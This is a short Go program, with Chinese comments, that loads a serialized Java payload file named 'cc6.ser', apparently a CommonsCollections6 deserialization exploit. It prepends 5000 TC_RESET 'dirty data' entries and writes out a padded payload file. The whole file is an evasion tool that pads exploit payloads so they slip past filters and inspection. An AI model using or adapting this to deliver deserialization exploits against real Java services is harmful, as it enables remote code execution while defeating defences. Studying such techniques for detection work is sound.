package main

import (
	"io/ioutil"
	"log"

	"github.com/phith0n/zkar/serz"
)

func main() {

	data, _ := ioutil.ReadFile("cc6.ser")
	serialization, err := serz.FromBytes(data)
	if err != nil {
		log.Fatal("parse error")
	}

	var dirtyData []*serz.TCContent

	// 构造脏数据,因为每次都要遍历Contents里的content,
	// 且每个content也要一次次的遍历成员，因此使用for循环设置"Flag: serz.JAVA_TC_RESET"
	// 即,将每个content里的TC_RESET集合到dirtyData,再最后添加到序列化结构中
	for i := 0; i < 5000; i++ {
		var blockData = &serz.TCContent{
			Flag: serz.JAVA_TC_RESET,
		}
		dirtyData = append(dirtyData, blockData)
	}
	// 添加脏数据
	serialization.Contents = append(dirtyData, serialization.Contents...)
	ioutil.WriteFile("cc6-padding-frist.ser", serialization.ToBytes(), 0o755)
}
